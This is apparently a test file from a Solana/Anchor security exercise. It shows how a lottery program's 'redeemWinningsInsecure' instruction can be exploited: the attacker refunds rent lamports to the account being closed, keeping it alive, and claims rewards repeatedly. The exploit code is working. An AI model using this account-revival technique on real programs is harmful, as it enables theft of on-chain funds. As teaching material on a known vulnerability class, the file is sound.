import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { ClosingAccounts } from "../target/types/closing_accounts";
import {
  PublicKey,
  Keypair,
  SystemProgram,
  Transaction,
  sendAndConfirmTransaction,
} from "@solana/web3.js";
import {
  getOrCreateAssociatedTokenAccount,
  createMint,
  getAccount,
} from "@solana/spl-token";
import { safeAirdrop } from "./utils/utils";
import { expect } from "chai";

describe("closing-accounts", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env());
  const provider = anchor.AnchorProvider.env();
  const program = anchor.workspace.ClosingAccounts as Program<ClosingAccounts>;
  const authority = Keypair.generate();
  let attackerAta: PublicKey = null;
  let rewardMint: PublicKey = null;
  let mintAuth: PublicKey = null;

  it("Enter lottery should be successful", async () => {
    const [mint, mintBump] = PublicKey.findProgramAddressSync(
      [Buffer.from("mint-seed")],
      program.programId
    );
    mintAuth = mint;

    await safeAirdrop(authority.publicKey, provider.connection);

    rewardMint = await createMint(
      provider.connection,
      authority,
      mintAuth,
      null,
      6
    );

    const associatedAcct = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      authority,
      rewardMint,
      authority.publicKey
    );
    attackerAta = associatedAcct.address;

    // tx to enter lottery
    await program.methods
      .enterLottery()
      .accounts({
        user: authority.publicKey,
        userAta: attackerAta,
      })
      .signers([authority])
      .rpc();
  });

  it("attacker can close + refund lottery acct + claim multiple rewards successfully", async () => {
    const [attackerLotteryEntry, bump] = PublicKey.findProgramAddressSync(
      [Buffer.from("test-seed"), authority.publicKey.toBuffer()],
      program.programId
    );
    // claim multiple times
    for (let i = 0; i < 2; i++) {
      let tokenAcct = await getAccount(provider.connection, attackerAta);

      const tx = new Transaction();

      // instruction claims rewards, program will try to close account
      tx.add(
        await program.methods
          .redeemWinningsInsecure()
          .accounts({
            userAta: attackerAta,
            rewardMint: rewardMint,
            user: authority.publicKey,
          })
          .signers([authority])
          .instruction()
      );

      // user adds instruction to refund dataAccount lamports
      const rentExemptLamports =
        await provider.connection.getMinimumBalanceForRentExemption(
          82,
          "confirmed"
        );
      tx.add(
        SystemProgram.transfer({
          fromPubkey: authority.publicKey,
          toPubkey: attackerLotteryEntry,
          lamports: rentExemptLamports,
        })
      );
      // send tx
      await sendAndConfirmTransaction(provider.connection, tx, [authority]);
      await new Promise((x) => setTimeout(x, 5000));
    }

    const tokenAcct = await getAccount(provider.connection, attackerAta);

    const lotteryEntry = await program.account.lotteryAccount.fetch(
      attackerLotteryEntry
    );

    expect(Number(tokenAcct.amount)).to.equal(
      lotteryEntry.timestamp.toNumber() * 10 * 2
    );
  });
});
